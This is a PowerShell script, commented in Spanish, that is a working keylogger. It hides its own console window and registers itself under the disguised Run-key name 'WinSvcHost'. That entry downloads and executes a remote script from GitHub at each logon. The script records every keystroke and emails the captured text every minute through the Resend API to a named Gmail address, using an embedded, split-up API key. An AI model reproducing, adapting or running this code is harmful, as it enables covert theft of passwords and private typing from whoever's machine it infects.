# Keylogger de sesion
$ApiKey  = 're_bieTm8sv' + '_8Mahptsrwdb5TjLx4adshvoa'
$Destino = 'adriancorreagutierrez@gmail.com'
$Url     = 'https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1'
$Minutos = 1
$Nombre  = 'WinSvcHost'
# Oculta su propia ventana de consola
Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c); [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();' -Name Ven -Namespace Win
[void][Win.Ven]::ShowWindow([Win.Ven]::GetConsoleWindow(), 0)

$soloUno = New-Object System.Threading.Mutex($false, "Local\$Nombre")
if (-not $soloUno.WaitOne(0)) { exit }

Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name $Nombre -Value "powershell -W Hidden -c iex(irm '$Url')" -Force

Add-Type -MemberDefinition @'
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] k);
[DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int ToUnicode(uint vk, uint sc, byte[] k, [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst=64)] System.Text.StringBuilder sb, int n, uint f);
'@ -Name Teclado -Namespace Win

$buffer   = New-Object System.Text.StringBuilder 64
$estado   = New-Object byte[] 256
$pulsadas = @{}
$especial = @{ 8='[BKSP]'; 9='[TAB]'; 13="`n"; 27='[ESC]'; 46='[DEL]'; 37='[<]'; 38='[^]'; 39='[>]'; 40='[v]' }

$ultimoEnvio = Get-Date
$acumulado   = ''

while ($true) {
    for ($tecla = 8; $tecla -lt 255; $tecla++) {
        if ([Win.Teclado]::GetAsyncKeyState($tecla) -band 0x8000) {
            if (-not $pulsadas[$tecla]) {
                $pulsadas[$tecla] = $true
                if ($especial.ContainsKey($tecla)) {
                    $caracter = $especial[$tecla]
                } else {
                    [void][Win.Teclado]::GetKeyboardState($estado)
                    $resultado = [Win.Teclado]::ToUnicode([uint32]$tecla, 0, $estado, $buffer, 64, 0)
                    $caracter = if ($resultado -ge 1) { $buffer.ToString() } else { '' }
                }
                if ($caracter) { $acumulado += $caracter }
            }
        } else {
            $pulsadas[$tecla] = $false
        }
    }

    if (((Get-Date) - $ultimoEnvio).TotalMinutes -ge $Minutos -and $acumulado.Length -gt 0) {
        $cuerpo = @{
            from    = 'onboarding@resend.dev'
            to      = $Destino
            subject = $env:COMPUTERNAME
            text    = $acumulado
        } | ConvertTo-Json -Compress
        try {
            Invoke-RestMethod 'https://api.resend.com/emails' -Method Post `
                -Headers @{ Authorization = "Bearer $ApiKey" } `
                -ContentType 'application/json' -Body $cuerpo -TimeoutSec 20 | Out-Null
        } catch {}
        $acumulado   = ''
        $ultimoEnvio = Get-Date
    }

    Start-Sleep -Milliseconds 12
}
